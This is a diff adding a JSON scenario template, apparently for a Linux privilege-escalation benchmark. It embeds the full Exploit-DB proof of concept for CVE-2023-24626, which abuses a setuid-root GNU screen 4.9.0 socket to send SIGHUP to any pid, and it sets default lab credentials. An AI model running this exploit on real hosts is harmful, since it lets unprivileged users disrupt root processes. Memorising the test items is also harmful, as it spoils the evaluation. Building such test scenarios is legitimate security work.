@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_51252",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: GNU screen v4.9.0 - Privilege Escalation (CVE-2023-24626)\n\nExploit source code (51252.py):\n```\n# Exploit Title: GNU screen v4.9.0 - Privilege Escalation\n# Date: 03.02.2023\n# Exploit Author: Manuel Andreas\n# Vendor Homepage: https://www.gnu.org/software/screen/\n# Software Link: https://ftp.gnu.org/gnu/screen/screen-4.9.0.tar.gz\n# Version: 4.9.0\n# Tested on: Arch Linux\n# CVE : CVE-2023-24626\n\nimport os\nimport socket\nimport struct\nimport argparse\nimport subprocess\nimport pty\nimport time\n\nSOCKDIR_TEMPLATE = \"/run/screens/S-{}\"\nMAXPATHLEN = 4096\nMAXTERMLEN = 32\nMAXLOGINLEN = 256\nSTRUCTSIZE = 12584\nMSG_QUERY   = 9\n\ndef find_latest_socket(dir):\n    return f\"{dir}/{sorted(os.listdir(dir))[-1]}\"\n\n\ndef build_magic(ver=5):\n    return ord('m') << 24 | ord('s') << 16 | ord('g') << 8 | ver\n\n\ndef build_msg(type):\n    return struct.pack(\"<ii\", build_magic(), type) + MAXPATHLEN * b\"T\"\n\n\ndef build_query(auser, nargs, cmd, apid, preselect, writeback):\n    assert(len(auser) == MAXLOGINLEN + 1)\n    assert(len(cmd) == MAXPATHLEN)\n    assert(len(preselect) == 20)\n    assert(len(writeback) == MAXPATHLEN)\n\n    buf = build_msg(MSG_QUERY)\n\n    buf += auser\n    buf += 3 * b\"\\x00\" #Padding\n    buf += struct.pack(\"<i\", nargs)\n    buf += cmd\n    buf += struct.pack(\"<i\", apid)\n    buf += preselect\n    buf += writeback\n\n    # Union padding\n    buf += (STRUCTSIZE - len(buf)) * b\"P\"\n\n    return buf\n\n\ndef spawn_screen_instance():\n    # provide a pty\n    mo, so = pty.openpty()\n    me, se = pty.openpty()\n    mi, si = pty.openpty()\n\n    screen = subprocess.Popen(\"/usr/bin/screen\", bufsize=0, stdin=si, stdout=so, stderr=se, close_fds=True, env={\"TERM\":\"xterm\"})\n\n    for fd in [so, se, si]:\n        os.close(fd)\n\n    return screen\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='PoC for sending SIGHUP as root utilizing GNU screen configured as setuid root.')\n    parser.add_argument('pid', type=int, help='the pid to receive the signal')\n\n    args = parser.parse_args()\n\n    pid = args.pid\n    username = os.getlogin()\n\n    screen = spawn_screen_instance()\n\n    print(\"Waiting a second for screen to setup its socket..\")\n    time.sleep(1)\n\n    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n    socket_path = find_latest_socket(SOCKDIR_TEMPLATE.format(username))\n\n    print(f\"Connecting to: {socket_path}\")\n    s.connect(socket_path)\n\n    print('Sending message...')\n    msg = build_query(username.encode('ascii') + (MAXLOGINLEN + 1 - len(username)) * b\"\\x00\", 0, MAXPATHLEN * b\"E\", pid, 20 * b\"\\x00\", MAXPATHLEN * b\"D\")\n    s.sendmsg([msg])\n\n    s.recv(512)\n\n    print(f'Ok sent SIGHUP to {pid}!')\n\n    screen.kill()\n\n\nif __name__ == '__main__':\n    main()\n```",
+  "cve": "CVE-2023-24626",
+  "exploitdb_id": "51252",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_51252",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
